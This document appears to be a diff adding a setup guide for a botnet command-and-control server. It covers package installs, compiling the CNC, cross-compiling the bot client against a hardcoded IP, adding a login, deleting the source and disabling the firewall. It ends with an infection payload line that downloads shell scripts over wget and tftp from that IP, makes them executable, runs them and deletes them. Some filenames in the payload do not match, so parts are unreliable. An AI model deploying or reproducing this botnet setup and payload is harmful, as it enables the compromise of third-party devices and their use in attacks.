@@ -1,0 +1,36 @@
+yum update -y
+yum install python-paramiko gcc screen nano wget httpd iptables perl -y;
+yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
+yum install epel-release -y
+yum install gengetopt -y
+
+```
+change ips and botport in client and put on server
+MAKE SURE TO PUT RESOLVER.H ON SERVER ASWELL!!
+```
+sudo apt-get install python
+sudo apt-get install screen
+sudo apt-get install pip
+sudo apt-get install nano
+sudo apt-get install gcc
+pip install subprocess 
+pip install sys
+pip install time
+gcc -o cnc cnc.c -pthread
+python cc7.py client.c 209.141.48.235
+
+echo root root >> fractured.txt
+rm -rf cnc.c
+screen ./cnc 23 1 9998
+NOTE If screen doesnt work then type "pkill screen" then try to screen again
+
+Done!!
+if the login prompt doesnt show up run these
+
+service iptables stop
+service httpd restart
+
+If you dont want bots to kill them selves, then type python nokill.py
+
+payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.48.235/fractured.sh; chmod 777 fractured2.sh; sh fractured.sh; ktftp 209.141.48.235 -c get fractured1.sh; chmod 777 fractured1.sh; sh ktftp1.sh; ktftp -r fractured2.sh -g 209.141.48.235; chmod 777 fractured2.sh; sh fractured2.sh; rm -rf fractured.sh fractured1.sh fractured2.sh;
